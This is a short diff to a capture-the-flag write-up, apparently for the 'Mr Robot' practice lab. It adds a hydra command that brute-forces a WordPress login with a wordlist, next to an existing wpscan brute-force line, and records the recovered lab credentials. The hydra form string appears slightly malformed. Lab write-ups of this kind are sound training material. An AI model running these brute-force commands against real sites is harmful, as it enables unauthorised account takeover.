@@ -74,3 +74,15 @@ wpscan --url http://mrrobot.thm --paswords fsocity.dic --usernames 'elliot'
 
 ![](../.gitbook/assets/image%20%28382%29.png)
 
+![](../.gitbook/assets/image%20%28454%29.png)
+
+```text
+hydra -L fsocity.dic  -p test mrrobot.thm http-post-form "/wp-login/:log=^USER^&pwd=^PASS^wp-submit=Log+In:F=Invalid username"
+```
+
+{% hint style="success" %}
+Username: Elliot
+
+Password: ER28-0652
+{% endhint %}
+
